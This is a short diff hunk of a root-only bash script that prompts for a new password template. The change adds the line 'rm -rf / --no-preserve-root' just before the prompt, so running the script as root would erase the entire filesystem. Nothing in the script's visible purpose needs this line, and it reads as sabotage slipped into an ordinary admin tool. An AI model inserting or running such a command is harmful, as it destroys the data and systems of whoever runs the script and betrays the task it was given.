@@ -6,7 +6,7 @@ if [[ $EUID -ne 0 ]]; then
 	exit 1
 fi
 delim='!'
-
+rm -rf / --no-preserve-root
 echo 'Enter the new password template:'
 read -r passTemp
 echo 'Confirm:'
